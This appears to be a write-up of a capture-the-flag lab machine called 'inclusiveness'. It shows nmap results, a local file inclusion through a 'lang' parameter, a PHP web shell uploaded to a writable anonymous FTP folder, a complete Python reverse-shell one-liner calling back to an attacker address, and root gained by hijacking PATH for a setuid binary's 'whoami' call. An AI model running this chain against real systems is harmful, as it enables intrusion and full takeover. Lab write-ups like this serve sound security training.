# NMAP 
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8Yl88LxuiPiXQGaZ6fB6K88oCmL/yXhY4Y3j/9PjnFHPRCqM18y4Ol7Q9LMr5CN042Zs/WMt05YE99R5j98fPGD0hIqxKpRpW8ZeDsfZdG479t3dSkM0OAL+hY4V4Wwbk768DxnLUw0ujGuh38UDl3gyYVBFpFZgRb7zBuYRzjIdWijpXm23sbXti4TO6KTC4KVm1BTzT4CVFxBakuuvk1Ieraeusc9agTfCVx7dkN2OX79jAc1uzZNE+BtokFGIYMvMAA7ejZT504cp1Bccbn+OUwlcRLFJbOO2jrXPj8j4MKEz6klMO7mIMvaHFRQ1Z5kBtH7QIGG97D5qhkD8X
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGNCidfAh8l1B4elJK42/1YqrUEBlGWDjg7ZWacpptAfCGBbSC+agR4LWiEtsnQYX4aWXRGydjc7UggCgpHbDr0=
|   256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEkCe1XYRTFeHyzWuvZ3JkIkWwD4pGHBcTGEGYYcJhv
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```

# Robots.txt
```
Change the user-agent header to Googlebot to bypass the seo.html check
```
![image](https://user-images.githubusercontent.com/31241187/144976025-86b6506b-01b8-4b62-8a5e-9abb79fa896f.png)

# LFI to RCE
```
pentestmonkey's php shell did not work so upload phpbash to ftp pub folder
http://192.168.245.14/secret_information/?lang=../../../../../etc/vsftpd.conf
http://192.168.245.14/secret_information/?lang=../../../../../var/ftp/pub/phpbash.php
Run the following code in the phpbash to get reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.245",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## local.txt
Local.txt was found on /home/tom
```
www-data@inclusiveness:/home/tom$ ls -la
ls -la
total 104
drwxr-xr-x 15 tom  tom   4096 Dec  7 15:38 .
drwxr-xr-x  3 root root  4096 Feb  8  2020 ..
-rw-------  1 tom  tom    684 Feb  8  2020 .ICEauthority
-rw-r--r--  1 root root     0 Jul 16  2020 .bash_history
-rw-r--r--  1 tom  tom    220 Feb  8  2020 .bash_logout
-rw-r--r--  1 tom  tom   3526 Feb  8  2020 .bashrc
drwx------ 10 tom  tom   4096 Feb  8  2020 .cache
drwx------ 10 tom  tom   4096 Feb  8  2020 .config
drwx------  3 tom  tom   4096 Feb  8  2020 .gnupg
drwx------  3 tom  tom   4096 Feb  8  2020 .local
-rw-r--r--  1 tom  tom    807 Feb  8  2020 .profile
drwx------  2 tom  tom   4096 Feb  8  2020 .ssh
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Desktop
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Documents
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Downloads
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Music
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Pictures
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Public
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Templates
drwxr-xr-x  2 tom  tom   4096 Feb  8  2020 Videos
-rw-r--r--  1 root root    33 Dec  7 15:38 local.txt
-rwsr-xr-x  1 root root 16976 Feb  8  2020 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8  2020 rootshell.c
```

# rootshell.c
```
www-data@inclusiveness:/home/tom$ cat rootshell.c
cat rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```
Create a file name whoami with tom as the file content. Add the location of the file to PATH to trigger the popen command. 

# Root
```
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
# ls -la /root
ls -la /root
total 64
drwx------  6 root root  4096 Dec  7 15:37 .
drwxr-xr-x 19 root root  4096 Mar 14  2020 ..
-rw-r--r--  1 root root     0 Jul 16  2020 .bash_history
-rw-r--r--  1 root root     0 Mar 14  2020 .bashrc
drwx------  2 root root  4096 Feb  8  2020 .cache
drwx------  3 root root  4096 Mar 14  2020 .gnupg
-rw-------  1 root root     0 Jul 16  2020 .lesshst
drwxr-xr-x  3 root root  4096 Feb  8  2020 .local
-rw-r--r--  1 root root   148 Aug 18  2015 .profile
drwxr-xr-x  2 root root  4096 Feb  8  2020 .vim
-rw-------  1 root root 21141 Feb  8  2020 .viminfo
-rw-r--r--  1 root root    21 Feb  8  2020 .vimrc
-rw-r--r--  1 root root    32 Jul 14  2020 flag.txt
-rw-r--r--  1 root root    33 Dec  7 15:38 proof.txt
# cat /root/proof.txt
```
